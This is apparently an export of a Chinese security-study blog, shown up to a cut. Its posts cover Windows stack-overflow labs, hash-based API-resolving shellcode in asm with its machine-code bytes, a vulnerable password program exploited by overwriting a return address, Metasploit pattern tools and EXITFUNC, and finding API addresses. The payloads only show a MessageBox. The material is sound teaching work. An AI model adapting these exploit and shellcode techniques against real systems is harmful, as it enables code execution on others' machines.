<p>由于shellcode最终是要放进缓冲区的，为了让shellcode更加通用，能被大多数缓冲区容纳，我们总是希望shellcode尽可能短。因此一般不会用“MessageBoxA”这么长的字符串进行直接比较。<br>通常会对所用的API函数进行hash运算，搜索导出表时对当前遇到的函数名同样进行hash。对比之后，判断是否是需要的API。</p>
<pre><code>
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

DWORD GetHash(char  *fun_name)
{
    DWORD digest=0;
    while(*fun_name)
    {
        digest = ((digest<<25)|(digest>>7));    // 循环右移7位
        digest += *fun_name;                    // 累加
        fun_name++;
    }
    return digest;
}

void main()
{
    DWORD hash;
    hash = GetHash("AddAtomA");
    printf("result of hash is %.8x\n", hash);
}
</25)|(digest></code></pre>

<p>通过该hash算法获得API函数对应的摘要</p>
<table>
<thead>
<tr>
<th>API函数</th>
<th>hash值</th>
</tr>
</thead>
<tbody>
<tr>
<td>MessageBoxA</td>
<td>0x1e380a6a</td>
</tr>
<tr>
<td>ExitProcess</td>
<td>0x4fd18963</td>
</tr>
<tr>
<td>LoadLibraryA</td>
<td>0x0c917432</td>
</tr>
</tbody>
</table>
<p>在将hash压入栈中之前，注意先将增量标志DF清零。因为当shellcode是利用异常处理机制而植入的时候，往往会产生标志位的变化，使shellcode中字符串处理方向发生变化而产生错误(如指令LODSD)。</p>
<p><img src="/images/2017-06-22/address_api.jpg" alt="定位API的流程图"></p>
<pre><code>
void main()
{
    __asm{
        CLD                    ;clear flag DF
        ;store hash
        push 0x1e380a6a        ;hash of MessageBoxA
        push 0x4fd18963        ;hash of ExitProcess
        push 0x0c917432        ;hash of LoadLibraryA
        mov esi, esp        ;esi = addr of first function hash
        lea edi,[esi-0xc]    ;edi = addr of start writing function

        ;make some stack space
        xor ebx,ebx
        mov bh, 0x04
        sub esp, ebx

        ;push a pointer to "user32" onto stack
        mov bx, 0x3233        ;32
        push ebx
        push 0x72657375        ;user
        push esp
        xor edx,edx

        ;find base addr of kernel32.dll
        mov ebx, fs:[edx+0x30]        ;ebx = address of PEB
        mov ecx, [ebx+0x0c]            ;ecx = pointer to loader data
        mov ecx, [ecx+0x1c]            ;ecx = first entry in initialization order list
        mov ecx, [ecx]                ;ecx = second entry in list
        ;mov ecx, [ecx]                ;ebp = base address of kernelbase.dll in after win7
                                    ;ebp = base address of kernel32.dll in before winxp
                                    ;some people may think it is the addr of kernel32.dll
                                    ;but it was wrong
        mov ebp, [ecx+0x8]            ;under the test, we know it is the addr of kernel32.dll

    find_lib_functions:
        //lodsd                        ;load next hash into al and increment esi
        mov eax, [esi]
        add esi, 0x4
        cmp eax, 0x1e380a6a            ;hash of MessageBoxA trigger
                                    ;LoadLibrary("user32")
        jne find_functions
        xchg eax,ebp                ;save current hash
        call [edi - 0x8]            ;LoadLibraryA
        xchg eax,ebp                ;restore current hash, and update ebp with base address of user32.dll

    find_functions:
        pushad                        ;preserve registers
        mov eax, [ebp + 0x3c]        ;eax = start of PE header
        mov ecx, [ebp + eax + 0x78]    ;ecx = relative offset of export table
        add ecx, ebp                ;ecx = absolute addr of export table
        mov ebx, [ecx + 0x20]        ;ebx = relative offset of names table
        add ebx, ebp                ;ebx = absolute addr of names table
        xor edi, edi                ;edi will count through the functions

    next_function_loop:
        inc edi                        ;increment function counter
        mov esi, [ebx + edi * 4]    ;esi = relative offset of current function name
        add esi, ebp                ;esi = absolute addr of current function  name
        cdq                            ;dl will hold hash(we know eax is small)

    hash_loop:
        movsx eax, byte ptr[esi]
        cmp al, ah
        jz compare_hash
        ror edx, 7
        add edx, eax
        inc esi
        jmp hash_loop

    compare_hash:
        cmp edx, [esp + 0x1c]    ;compare to the requested hash(saved on stack from pushad)
        jnz next_function_loop
        mov ebx, [ecx + 0x24]    ;ebx = relative offset of ordinals table
        add ebx, ebp            ;ebx = absolute addr of ordinals table
        mov di, [ebx + 2*edi]    ;di = ordinal number of matched function
        mov ebx, [ecx + 0x1c]    ;ebx = relative offset of address table
        add ebx, ebp            ;ebx = absolute addr of address table
        add ebp, [ebx + 4*edi]    ;add to ebp(base addr of module) the relative offset of matched function
        xchg eax, ebp            ;move func addr into eax
        pop edi                    ;edi is last onto stack in pushad
        stosd                    ;write function addr to [edi] and increment edi
        push edi
        popad                    ;restore registers
                                ;loop until we reach end of the last hash
        cmp eax, 0x1e380a6a
        jne find_lib_functions

    function_call:
        xor ebx, ebx
        push ebx                ;cut string
        push 0x74736577
        push 0x6C696166            ;push failwest
        mov eax, esp            ;load address of failwest
        push ebx
        push eax
        push eax
        push ebx
        call [edi - 0x4]        ;call MessageBoxA
        push ebx
        call [edi - 0x8]        ;call ExitProcess
        nop
        nop
        nop
        nop
    }
}
</code></pre>

<p>其对应的机器码为：</p>
<pre><code>
char shellcode2[] = 
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";

void main()
{
    __asm
    {
        lea eax, shellcode2
        push eax
        ret
    }
}
</code></pre>]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> shellcode </tag>
            
            <tag> stack </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[栈溢出原理与实践]]></title>
      <url>/2017/06/22/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/</url>
      <content type="html"><![CDATA[<p><b>声明：本章的所有实验都是在Windows 2000 Server上完成的。生成字符串并查找其偏移是在kali 2.0上，查找跳转函数的VA是在windows 10上用IDA。</b></p>
<h3 id="1-栈溢出原理"><a href="#1-栈溢出原理" class="headerlink" title="1. 栈溢出原理"></a>1. 栈溢出原理</h3><h4 id="1-1-修改邻接变量的原理"><a href="#1-1-修改邻接变量的原理" class="headerlink" title="1.1 修改邻接变量的原理"></a>1.1 修改邻接变量的原理</h4><p>用实例来反映原理</p>
<pre><code>
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

#define PASSWORD "1234567"

int verify_password(char *password)
{
    int authenticated;
    char buffer[8];
    authenticated = strcmp(password, PASSWORD);
    strcpy(buffer, password);
    return authenticated;
}

void main()
{
    int valid_flag = 0;
    char password[1024];
    while(1)
    {
        printf("please input password:        ");
        scanf("%s", password);
        valid_flag = verify_password(password);
        if (valid_flag)
        {
            printf("incorrect password!\n\n");
        }
        else
        {
            printf("Congratulations! You have passed the verification!\n");
            break;
        }
    }
}

</code></pre>

<p>于是栈帧布局为：<br><img src="/images/2017-06-22/stack_layout.png" alt="栈帧布局"></p>
<p>因此，当你输入7位正确密码（&quot;1234567&quot;）或者输入8字节其他字符串（比原始字符串要大），都能通过验证。authenticated是int类型，在内存中是DWORD，占4个字节。所以当输入8位后，数组越界，buffer[8]、buffer[9]、buffer[10]、buffer[11]将写入相邻的变量authenticated中。</p>
<font color="#f00">win32系统中数据是由低位向高位存储一个4字节的双字（DWORD），但作为数值应用时，却是按照由高位字节向低位字节进行解释。</font>

<p>如果输入的是1234567，那么结果为：<br>34 33 32 31<br>00 37 36 35<br>一定要注意window字节顺序</p>
<h4 id="1-2-修改函数返回地址"><a href="#1-2-修改函数返回地址" class="headerlink" title="1.2 修改函数返回地址"></a>1.2 修改函数返回地址</h4><p>通过覆盖返回地址，我们可以跳转到我们想到达的位置</p>
<p><b>问题1：如何修改返回地址，并准确的判定返回地址所在位置？</b></p>
<font color="#0f0">在函数返回的&quot;retn&quot;指令执行时，栈顶元素恰好是这个返回地址。“retn”指令会把这个地址弹入EIP寄存器中，之后跳转到这个地址去执行。栈顶是OllyDbg右侧ESP标灰的那个</font>

<p>所以常见的解决办法是：<br>（1）输入一个较长的字符串，最好这个字符串有一定规律【这里可以使用/usr/share/metasploit-framework/tools/exploit/pattern_create.rb来创建一定长度的指令】，然后查看返回地址所指向的位置，看看是刚才所指定的字符串的哪个位置【这里可以使用/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 来查看字符串出现的地址】<br>（2）本机实验时，offset位置为16（此处的16指的是起始位置），因此如果想要对该程序的返回地址进行修改的话，就应该是<br>               <font color="#f00">&#39;a&#39;*16+返回地址</font><font color="#0f0">（返回地址得逆序编写）</font></p>
<p><b>问题2：如何控制程序执行流程？</b></p>
<p>上面已经讲了如何修改返回地址，所以如果在进入某个子函数之后，有栈溢出，就可以修改相应的返回地址，让其能够跳转至想让其执行代码的位置，这样就能控制流程；</p>
<p>另外一种十分简单的办法就是直接修改PE文件，修改分支指令，这样也可以控制程序执行流程！</p>
<h3 id="2-代码植入"><a href="#2-代码植入" class="headerlink" title="2. 代码植入"></a>2. 代码植入</h3><h4 id="2-1-测试代码"><a href="#2-1-测试代码" class="headerlink" title="2.1 测试代码"></a>2.1 测试代码</h4><pre><code>
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;windows.h&gt;

#define PASSWORD "1234567"

int verify_password(char *password)
{
    int authenticated;
    char buffer[44];        //add local buff to be overflowed
    authenticated = strcmp(password, PASSWORD);
    strcpy(buffer, password);    //overflowed here!
    return authenticated;
}

void main()
{
    int valid_flag = 0;
    char password[1024];
    FILE *fp;
    LoadLibrary("user32.dll");    //prepare for messagebox
    if (!(fp=fopen("password.txt","rw+")))
    {
        exit(0);
    }
    //MessageBoxA(0,"123","123",0);
    fscanf(fp, "%s", password);
    valid_flag = verify_password(password);
    if(valid_flag)
    {
        printf("incorrect password!\n\n");
    }
    else
    {
        printf("Congratulations! You have passed the verification!\n\n");
    }
    fclose(fp);
}
</code></pre>

<font color="#dd0">其中头文件windows.h，是方便程序能够顺利调用LoadLibrary函数去装载user32.dll<br>verify_password函数的局部变量buffer由8个字节增加到44字节，这样做是为了有足够的空间来“承载”我们植入的代码。<br>main函数中增加了LoadLibrary(&quot;user32.dll&quot;)用于初始化装载user32.dll，以便在植入代码中调用MessageBox。<br></font>

<p><b>需要完成的工作：</b></p>
<ol>
<li>分析并调试漏洞程序，获得淹没返回地址的偏移</li>
<li>获得buffer的起始地址，并将其写入password.txt的相应偏移，用来冲刷返回地址</li>
<li>向password.txt中写入可执行的机器代码，用来调用API弹出一个消息框。</li>
</ol>
<font color="#f00">通过调试可以获得buffer数组的起始地址0x0012FAF0，以及password.txt文件中第53~56个字符的ASCII码值将写入栈帧中的返回地址，成为函数返回后执行的指令地址</font>

<p>MSDN对该函数的解释如下：</p>
<pre><code>
int WINAPI MessageBox(
  _In_opt_ HWND    hWnd,        //handle to owner window
  _In_opt_ LPCTSTR lpText,        //text in message box
  _In_opt_ LPCTSTR lpCaption,    //messagebox title
  _In_     UINT    uType        //Messagebox style
);
</code></pre>

<ul>
<li>hWnd[in] 消息框所属窗口的句柄，如果为NULL，消息框则不属于任何窗口</li>
<li>IpText[in]  字符串指针，所指字符串会在消息框中显示</li>
<li>IpCaption[in]  字符串指针，所指字符串将成为消息框的标题</li>
<li>uType[in]  消息框的风格（单按钮、多按钮等），NULL代表默认风格</li>
</ul>
<p>熟悉MFC的程序员都知道，系统其实并不存在真正的MessageBox函数，对MessageBox这类API的调用最终都将由系统按照参数中字符串的类型选择“A”类函数（ASCII）或者“W”类型函数（UNICODE）调用。因此，本文中用的是MessageBoxA。</p>
<p><b>用汇编语言调用MessageBoxA需要三个步骤</b></p>
<ol>
<li>装载动态链接库user32.dll。MessageBoxA是动态链接库user32.dll的导出函数。虽然大多数有图形界面的程序都已经装载了该库，但是本实验的Console程序并没有默认加载。</li>
<li>在汇编语言中调用该函数需要获得这个函数的入口地址</li>
<li>在调用前需要向栈中从右向左的顺序压入MessageBoxA的4个参数</li>
</ol>
<font color="#f00">获取MessageBoxA的方式，我们在《查找动态链接库的API地址》那一篇博文中有讲，这里仅仅给出Windows 2000 Server的MessageBoxA地址为0x77E16544.</font>

<p>下面将让弹出的窗口显示标题和文本内容都为“failwest”，而压入的第一个和第四个参数都为NULL。</p>
<p><b><center>机器代码(具体操作可以参见《机器代码与汇编代码的转换》)</center></b></p>
<table>
<thead>
<tr>
<th>机器代码（十六进制）</th>
<th>汇编指令</th>
<th>注释</th>
</tr>
</thead>
<tbody>
<tr>
<td>33DB</td>
<td>XOR EBX, EBX</td>
</tr>
<tr>
<td>53</td>
<td>PUSH EBX</td>
</tr>
<tr>
<td>6877657374</td>
<td>PUSH 74736577</td>
</tr>
<tr>
<td>6877657374</td>
<td>PUSH 74736577</td>
<td>压入NULL结尾的&quot;failwest&quot;字符串。之所以使用EBX清零后作为字符串的截断符，是为了避免&quot;PUSH 0&quot;中的NULL，否则植入的机器码会被strcpy函数截断</td>
</tr>
<tr>
<td>8BC4</td>
<td>MOV EAX, ESP</td>
<td>EAX里是字符串指针</td>
</tr>
<tr>
<td>53</td>
<td>PUSH EBX</td>
</tr>
<tr>
<td>50</td>
<td>PUSH EAX</td>
</tr>
<tr>
<td>50</td>
<td>PUSH EAX</td>
</tr>
<tr>
<td>53</td>
<td>PUSH EBX</td>
<td>4个参数按照从右向左的顺序入栈，分别是(0,failwest,failwest,0)<br></td>
</tr>
</tbody>
</table>
<p>消息框是默认风格，文本区和标题都是&quot;failwest&quot;|<br>|B84465E177|MOV EAX, 0x77E16544|<br>|FFD0|CALL EAX|调用函数MessageBoxA。这里的地址依据机器而定|</p>
<p>然后在这些代码与53—56处的buffer中0x0012FAF0(返回地址)，其余的字节用0x90(nop指令)填充。</p>
<p>shellcode[] = &quot;\x33\xdb\x53\x68\x77\x65\x73\x74\x68\x77\x65\x73\x74<br>\x8b\xc4\x53\x50\x50\x53\xb8\x44\x65\xe1\x77\xff\xd0\x90<br>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90<br>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xf0\xfa\x12\x00&quot;</p>
<p><img src="/images/2017-06-22/failwest_test.jpg" alt="测试结果"></p>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
            <tag> stack </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[栈的介绍]]></title>
      <url>/2017/06/22/%E6%A0%88%E7%9A%84%E4%BB%8B%E7%BB%8D/</url>
      <content type="html"><![CDATA[<h3 id="1、内存的不同用途"><a href="#1、内存的不同用途" class="headerlink" title="1、内存的不同用途"></a>1、内存的不同用途</h3><p>进程使用的内存按照功能分为以下4个部分：<br>（1）代码区：这个区域存储着被装入执行的二进制机器代码，处理器会到这个区域取出指令并执行。<br>（2）数据区：用于存储全局变量<br>（3）堆区：进程可以在堆区动态地请求一定大小的内存，并在用完之后归还给堆区。动态分配和回收是堆区的特点。<br>（4）栈区：用于动态地存储函数之间的调用关系，以保证被调用函数在返回时恢复到母函数中继续执行。</p>
<p> 协作过程如图所示：<br><img src="/images/2017-06-22/stack_cooperate.png" alt="协作过程图"></p>
<p>内存中的栈区其实就是系统栈。系统栈由系统来维护。</p>
<h3 id="2、函数调用过程"><a href="#2、函数调用过程" class="headerlink" title="2、函数调用过程"></a>2、函数调用过程</h3><pre><code>int func_B(int arg_B1, int arg_B2)
{
     int var_B1, var_B2;
     var_B1 = arg_B1 + arg_B2;
     var_B2 = arg_B1 - arg_B2;
     return var_B1 * var_B2;
}

int func_A(int arg_A1, int arg_A2)
{
     int var_A;
     var_A = func_B(arg_A1, arg_A2) + arg_A1;
     return var_A;
}

int main(int argc, char **argv, char **envp)
{
     int var_main;
     var_main = func_A(4,3);
     return var_main;
}
</code></pre><p>同一文件的不同函数的代码在内存代码区中的分布可能是相邻也可能相距很远。代码的调用也如下图所示。<br><img src="/images/2017-06-22/code_addr.jpg" alt="代码指令所在位置和CPU在代码区中的取指轨迹"></p>
<p>代码区精确的跳转是在与系统栈巧妙地配合过程中完成的。当函数被调用时，系统栈会为这个函数开辟一个新的栈帧，并把它压入栈中。这个栈帧中的内存空间被它所属的函数独占，正常情况下是不会和别的函数共享的。当函数返回时，系统栈会弹出该函数所对应的栈帧。<br><img src="/images/2017-06-22/stack_call.jpg" alt="系统栈在函数调用中的变化"></p>
<p>调用时的步骤：<br>（1）母函数调用子函数时，首先现在母函数所在栈帧里压入函数返回地址（一般为调用函数下面一条指令），然后为子函数创建新栈帧并压入系统栈（一般的步骤为push ebp[保存旧栈帧底部]  -&gt;  mov ebp, esp[将现在的栈顶换做栈帧底部]  -&gt; sub esp, xxx[抬高栈顶，为新栈帧开辟空间]）。<br>（2）子函数返回时，子函数的栈帧被弹出系统栈，母函数栈帧中的返回地址出现在栈顶，此时处理器按照这个返回地址重新跳到母函数代码区中执行。</p>
<h3 id="3、寄存器与函数栈帧"><a href="#3、寄存器与函数栈帧" class="headerlink" title="3、寄存器与函数栈帧"></a>3、寄存器与函数栈帧</h3><p>（1）ESP：栈指针寄存器（extended stack pointer），其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。<br>（2）EBP：基址指针寄存器（extended stack pointer），其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</p>
<p>在函数栈帧中，一般包含以下几类重要信息：<br>（1）局部变量：为函数局部变量开辟的内存空间。<br>（2）堆栈状态值：保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部可以通过堆栈平衡计算得到），用于在本栈中被弹出后恢复出上一个栈帧。<br>（3）函数返回地址：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置，以便在函数返回时能够恢复到函数被调用前的代码区中继续执行指令。</p>
<h3 id="4、函数调用约定与相关指令"><a href="#4、函数调用约定与相关指令" class="headerlink" title="4、函数调用约定与相关指令"></a>4、函数调用约定与相关指令</h3><p><b><center>几种调用方式的差异</center></b></p>
<table>
<thead>
<tr>
<th></th>
<th>C</th>
<th>SysCall</th>
<th>StdCall</th>
<th>BASIC</th>
<th>FORTRAN</th>
<th>PASCAL</th>
</tr>
</thead>
<tbody>
<tr>
<td>参数入栈顺序</td>
<td>右-&gt;左</td>
<td>右-&gt;左</td>
<td>右-&gt;左</td>
<td>左-&gt;右</td>
<td>左-&gt;右</td>
<td>左-&gt;右</td>
</tr>
<tr>
<td>恢复栈平衡操作的位置</td>
<td>母函数</td>
<td>子函数</td>
<td>子函数</td>
<td>子函数</td>
<td>子函数</td>
<td>子函数</td>
</tr>
</tbody>
</table>
<p><b><center>函数调用的约定</center></b></p>
<table>
<thead>
<tr>
<th>调用约定的声明</th>
<th>参数入栈顺序</th>
<th>恢复栈平衡的位置</th>
</tr>
</thead>
<tbody>
<tr>
<td>__cdecl</td>
<td>右-&gt;左</td>
<td>母函数</td>
</tr>
<tr>
<td>__fastcall</td>
<td>右-&gt;左</td>
<td>子函数</td>
</tr>
<tr>
<td>__stdcall</td>
<td>右-&gt;左</td>
<td>子函数</td>
</tr>
</tbody>
</table>
<font color="#f00">默认情况下，VC会使用__stdcall调用方式</font>

<font color="#f00">C++类成员函数都有一个this指针，在Windows平台中，这个指针一般是用ECX寄存器来传递的；但如果用GCC编译器编译，这个指针会作为最后一个参数压入栈中。</font>

<p><b>参数调用步骤</b>：</p>
<ol>
<li>参数入栈：由右向左压入参数</li>
<li>返回地址入栈：当前代码区调用指令的下一条指令地址压入栈中，供函数返回时继续执行</li>
<li>代码区跳转：处理器从当前代码区跳转至被调用函数的入口处</li>
<li>栈帧调整：保存当前栈帧状态值，以备后面恢复栈帧时使用（EBP入栈）；将当前栈帧切换到新栈帧（EBP&lt;-ESP，更新栈帧底部）；给新栈帧分配空间（将ESP减去所需空间的大小，抬高栈顶）</li>
</ol>
<pre><code>
;调用前
push 参数3    ;假设函数有3个参数，那么参数将由右向左依次入栈
push 参数2
push 参数1
call 函数dizhi ;call指令将同时完成两项工作
              ; a) 向栈中压入当前指令的下一条指令在内存中的位置，即保存返回地址
              ; b) 跳转到所用函数的入口地址函数入口处
push ebp    ;保存旧栈帧的底部
mov ebp, esp    ;设置新栈帧的底部（栈帧切换）
sub esp, xxx    ;设置新栈帧的顶部（抬高栈顶，为新栈帧开辟空间）
</code></pre>

<p><img src="/images/2017-06-22/stack_info.png" alt="函数调用时系统栈中的变化情况"></p>
<p><b>函数返回时的步骤</b>：</p>
<ol>
<li>保存返回值（通常将函数的返回值保存到EAX中）</li>
<li>弹出当前栈帧，恢复上一个栈帧：在栈帧平衡的基础上，给ESP加上栈帧的大小，降低栈顶，回收当前栈帧的空间；将当前栈帧底部保存的前栈帧EBP值弹入EBP寄存器，恢复上一个栈帧；将函数返回地址弹给EIP寄存器</li>
<li>跳转：按照函数返回地址跳回母函数中继续执行</li>
</ol>
<pre><code>
add esp, xxx    ;降低栈顶，回收当前的栈帧
pop ebp            ;将上一个栈帧底部恢复到ebp
retn            ;这条指令有两个功能
                ;a) 弹出当前栈顶元素，即弹出栈帧中的返回地址。
                ;b) 让处理器跳转至弹出的返回地址，恢复调用前的代码区
</code></pre>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
            <tag> stack </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[机器代码与汇编代码的转换]]></title>
      <url>/2017/06/22/%E6%9C%BA%E5%99%A8%E4%BB%A3%E7%A0%81%E4%B8%8E%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E7%9A%84%E8%BD%AC%E6%8D%A2/</url>
      <content type="html"><![CDATA[<p>机器代码与汇编代码之间的转换是写shellcode的一个十分重要的环节，所以这一讲主要讲使用那些工具能够方便的进行这两者之间的转换。</p>
<p><br></p>
<h4 id="Asm2MachineCode-x86"><a href="#Asm2MachineCode-x86" class="headerlink" title="Asm2MachineCode(x86)"></a>Asm2MachineCode(x86)</h4><font color="#0f0">这在吾爱破解工具包=&gt;编辑辅助工具</font>

<p>该工具主要用于机器代码与汇编代码之间的转换，但是局限也很明显，这只能用于x86的机器。</p>
<p><img src="/images/2017-06-22/Asm2MachineCode.jpg" alt="机器代码与汇编代码的转化"></p>
<font color="#f00">需要说明的是，这个编辑器功能强大，十分适合用户进行shellcode的编写。但实际上shellcode的编写一般速度很慢，所以也不一定非用这个不可！</font>

<p><br></p>
<h4 id="C32asm"><a href="#C32asm" class="headerlink" title="C32asm"></a>C32asm</h4><font color="#0f0">这在吾爱破解工具包=&gt;反编译工具</font><br>使用其 工具-&gt;汇编代码查询<br><font colot="#f00">就目前而言，该功能只能从汇编代码转化为机器代码，所以局限性很强；而且一次只能转换一条指令。</font>


<p><br></p>
<h4 id="OllyDbg"><a href="#OllyDbg" class="headerlink" title="OllyDbg"></a>OllyDbg</h4><p>当导入某一运行的程序之后，可以看到运行程序中每条指令的二进制代码以及对应的汇编代码。</p>
<p>当然，如果想要查看自己编写的汇编语言对应的机器代码，或者想找到机器代码对应的汇编语言，可以对主程序框中部分代码进行修改得到。</p>
<font color="#foo">可能是了解的比较少，总觉得这么强大的调试工具应该会有十分实用的机器代码与汇编代码的转换工具，但是现在只是找到了上述所讲的那种笨办法！希望后续能够找到。。。</font>

]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[关于metasploit的EXITFUNC参数的解释]]></title>
      <url>/2017/06/22/%E5%85%B3%E4%BA%8Emetasploit%E7%9A%84EXITFUNC%E5%8F%82%E6%95%B0%E7%9A%84%E8%A7%A3%E9%87%8A/</url>
      <content type="html"><![CDATA[<p>这个简单的介绍是从Google上搜的，当我们使用metasploit框架时经常会遇到EXITFUNC这个参数，这个参数是干什么用的呢？</p>
<font color="#f00">EXITFUNC有4个不同的值：none，seh，thread和process。通常它被设置为线程或进程，它对应于ExitThread或ExitProcess调用。 “none”参数将调用GetLastError，实际上是无操作，线程然后将继续执行，允许您简单地将多个有效负载一起串行运行。<br><br>在某些情况下，EXITFUNC是有用的，在利用一个exploit之后，我们需要一个干净地退出 </font>

<h4 id="SEH："><a href="#SEH：" class="headerlink" title="SEH："></a>SEH：</h4><font color="#00f">This method should be used when there is a structured exception handler (SEH) that will restart the thread or process automatically when an error occurs.</font>

<p>当存在结构化异常处理程序（SEH），且触发该SEH将自动重启线程或进程时，应使用此方法。</p>
<h4 id="THREAD："><a href="#THREAD：" class="headerlink" title="THREAD："></a>THREAD：</h4><font color="#00f">This method is used in most exploitation scenarios where the exploited process (e.g. IE) runs the shellcode in a sub-thread and exiting this thread results in a working application/system (clean exit)</font>

<p>此方法用于大多数场景，其中被利用的进程（例如IE）在子线程中运行shellcode并退出此线程会导致正在工作的应用程序/系统（清除退出）。</p>
<h4 id="PROCESS："><a href="#PROCESS：" class="headerlink" title="PROCESS："></a>PROCESS：</h4><font color="#00f">This method should be used with multi/handler. This method should also be used with any exploit where a master process restarts it on exit.</font>

<p>此方法应与multi/handler这个利用模块一起使用。此方法也应该与任何主进程在退出时会重新启动的漏洞一起使用。</p>
]]></content>
      
        <categories>
            
            <category> 安全工具 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> metasploit </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[查找动态链接库的API地址]]></title>
      <url>/2017/06/22/%E6%9F%A5%E6%89%BE%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E7%9A%84API%E5%9C%B0%E5%9D%80/</url>
      <content type="html"><![CDATA[<h3 id="1、开始之前"><a href="#1、开始之前" class="headerlink" title="1、开始之前"></a>1、开始之前</h3><p>为什么要获取动态链接库的API函数地址，这是为了方便测试时得到需要的函数，并通过该函数进行一系列的操作。<br>而为了能够写出shellcode，需要的是这个动态链接库的API函数的地址，因而需要掌握获取API地址的方法。</p>
<h3 id="2、使用OllyDbg获取动态链接库的API函数地址"><a href="#2、使用OllyDbg获取动态链接库的API函数地址" class="headerlink" title="2、使用OllyDbg获取动态链接库的API函数地址"></a>2、使用OllyDbg获取动态链接库的API函数地址</h3><font color="#0f0">本文以获取动态链接库user32.dll中的MessageBoxA函数地址为例。</font>

<p>（1）首先使用OllyDbg打开一个使用了该动态链接库的PE程序<br>其实包含user32.dll的程序有很多，大致上只要含有图形界面，就需要user32.dll这个动态链接库。<br>我们以windows系统中最为常见的calc.exe为例(calc是计算器程序，很明显有界面；其存放在c:\windows\system32\calc.exe)</p>
<p>（2）使用OllyDbg的查看可执行模块的功能<br>点击查看-&gt;可执行模块<br>可以看到下面的界面</p>
<p><img src="/images/2017-06-22/executable.jpg" alt="OllyDbg查看可执行模块"></p>
<p>（3）点击user32.dll，右键点击查看名称</p>
<p><img src="/images/2017-06-22/find_name.png" alt="查看动态链接库的API函数"></p>
<p>（4）找到MessageBoxA，并得到其对应的地址</p>
<p><img src="/images/2017-06-22/find_address.jpg" alt="找到API函数地址"></p>
<h3 id="3、使用C32asm获取动态链接库的API函数地址"><a href="#3、使用C32asm获取动态链接库的API函数地址" class="headerlink" title="3、使用C32asm获取动态链接库的API函数地址"></a>3、使用C32asm获取动态链接库的API函数地址</h3><font color="#0f0">【该工具属于吾爱破解工具包=&gt;反编译工具】</font><br>点击 工具-&gt;API地址查询<br><br><img src="/images/2017-06-22/C32asm_API_address.jpg" alt="使用C32asm查询dll的API函数地址"><br><br><font color="#f00">毫无疑问，从简易程度来看，使用C32asm查询的速度更快，而且更为适合用户！！！</font>

]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用MSF发布POC]]></title>
      <url>/2017/06/21/%E4%BD%BF%E7%94%A8MSF%E5%8F%91%E5%B8%83POC/</url>
      <content type="html"><![CDATA[<h3 id="1、开始之前"><a href="#1、开始之前" class="headerlink" title="1、开始之前"></a>1、开始之前</h3><p>其实Metasploit一直是我想学习的安全工具，但是由于其功能实在太强大了，如果没有基础就开始使用，难免会有点因噎废食的感觉，所以我在学习《0day安全 软件漏洞分析技术》的过程中，做了些许CTF的逆向题，看了不少该类型题的writeup，最后才开始我的Metasploit学习之旅。</p>
<h3 id="2、环境要求"><a href="#2、环境要求" class="headerlink" title="2、环境要求"></a>2、环境要求</h3><table>
<thead>
<tr>
<th></th>
<th style="text-align:left">推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>攻击者操作系统</td>
<td style="text-align:left">Kali2.0</td>
<td>Kali主机上装有MSF，免去我们重新安装MSF的步骤</td>
</tr>
<tr>
<td>靶机操作系统</td>
<td style="text-align:left">Win XP SP3</td>
<td>其他的windows操作系统也可以使用，但是exploit覆盖的函数返回地址会发生改变</td>
</tr>
<tr>
<td>靶机编辑器</td>
